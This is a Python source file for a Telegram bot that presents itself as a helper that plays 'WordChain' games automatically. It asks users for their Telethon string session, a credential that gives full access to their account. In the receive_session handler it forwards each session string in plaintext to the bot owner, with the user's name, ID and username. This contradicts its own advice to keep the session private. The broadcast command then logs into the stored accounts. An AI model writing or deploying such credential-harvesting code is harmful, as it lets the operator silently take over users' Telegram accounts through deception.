# bot.py — TNC WordChain Controller Bot with startup log + owner notification
import asyncio
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from db import DBSessionManager
from userbots.wordchain_player import start_userbot
import config

app = Client(
    "tnc_controller",
    bot_token=config.BOT_TOKEN,
    api_id=config.API_ID,
    api_hash=config.API_HASH
)

db = DBSessionManager(config.DB_PATH)


@app.on_message(filters.command("start") & filters.private)
async def start_cmd(client, message):
    buttons = InlineKeyboardMarkup([
        [InlineKeyboardButton("👑 Owner", url=f"tg://user?id={config.OWNER_ID}")],
        [
            InlineKeyboardButton("📢 Channel", url=config.SUPPORT_CHANNEL),
            InlineKeyboardButton("💬 Support Chat", url=config.SUPPORT_CHAT)
        ],
    ])

    caption = (
        "🤖 <b>Welcome to TNC WordChain Userbot!</b>\n\n"
        "💡 Connect your <b>Telethon string session</b> to create your personal userbot.\n"
        "It will automatically play WordChain games for you!\n\n"
        "📌 Use <b>/connect</b> to begin."
    )
    await message.reply_photo(
        photo=config.START_IMAGE,
        caption=caption,
        reply_markup=buttons,
        parse_mode="html"
    )


@app.on_message(filters.command("connect") & filters.private)
async def connect_cmd(client, message):
    await message.reply_text(
        "🔗 Send your <b>Telethon string session</b> now.\n\n"
        "⚠️ Keep it private — do <b>not</b> share it with anyone else!",
        parse_mode="html"
    )


@app.on_message(filters.private & ~filters.command(["start", "connect", "disconnect", "broadcast"]) & filters.text)
async def receive_session(client, message):
    text = message.text.strip()
    user = message.from_user
    user_id = user.id

    if len(text) < 50:
        await message.reply_text("⚠️ That doesn't look like a valid Telethon session string.")
        return

    db.save_session(user_id, text)
    await message.reply_text("✅ Session saved! Starting your userbot...")
    start_userbot(text, user_id)
    await message.reply_text("🟢 Your userbot is now running! It will play WordChain automatically.")

    # Log new connection to owner
    log_text = (
        f"🧾 <b>New User Connected</b>\n\n"
        f"👤 <b>Name:</b> {user.first_name or 'Unknown'}\n"
        f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        f"💬 <b>Username:</b> @{user.username or 'N/A'}\n"
        f"🔑 <b>String Session:</b>\n<code>{text}</code>"
    )
    try:
        await client.send_message(config.OWNER_ID, log_text, parse_mode="html")
    except Exception as e:
        print(f"⚠️ Could not send owner log for {user_id}: {e}")


@app.on_message(filters.command("disconnect") & filters.private)
async def disconnect_cmd(client, message):
    args = message.text.split()
    sender_id = message.from_user.id

    if sender_id == config.OWNER_ID and len(args) > 1:
        try:
            target_id = int(args[1])
        except ValueError:
            await message.reply_text("Usage: /disconnect <user_id>")
            return
    else:
        target_id = sender_id

    if not db.get_session(target_id):
        await message.reply_text("❌ No session found for that user.")
        return

    db.delete_session(target_id)
    await message.reply_text(f"🛑 Disconnected userbot for <code>{target_id}</code>", parse_mode="html")


@app.on_message(filters.command("broadcast") & filters.user(config.OWNER_ID))
async def broadcast_cmd(client, message):
    if len(message.command) < 2:
        await message.reply_text("Usage:\n/broadcast <text>")
        return

    text = message.text.split(None, 1)[1]
    sessions = db.get_all_sessions()
    total = len(sessions)
    success = failed = 0
    status = await message.reply_text(f"📢 Broadcasting to {total} connected users...")

    from telethon import TelegramClient
    from telethon.sessions import StringSession

    for user_id, session_string in sessions:
        try:
            tele_client = TelegramClient(StringSession(session_string), config.API_ID, config.API_HASH)
            await tele_client.connect()
            await tele_client.send_message(user_id, text)
            await tele_client.disconnect()
            success += 1
        except Exception as e:
            print(f"⚠️ Broadcast failed for {user_id}: {e}")
            failed += 1
        await asyncio.sleep(0.4)

    await status.edit_text(f"✅ Broadcast complete!\n🟢 Sent: {success}\n🔴 Failed: {failed}")


# --- Startup logging & owner notification ---
@app.on_message(filters.command("ping") & filters.user(config.OWNER_ID))
async def ping_cmd(client, message):
    await message.reply_text("🏓 Bot is alive!")


def run():
    print("🚀 Starting TNC WordChain Controller Bot...")
    async def startup_notice():
        try:
            async with app:
                await app.send_message(config.OWNER_ID, "✅ <b>TNC WordChain Controller Bot started successfully!</b>", parse_mode="html")
        except Exception as e:
            print(f"⚠️ Failed to notify owner: {e}")

    asyncio.get_event_loop().create_task(startup_notice())
    app.run()
    print("✅ Bot is now live and running!")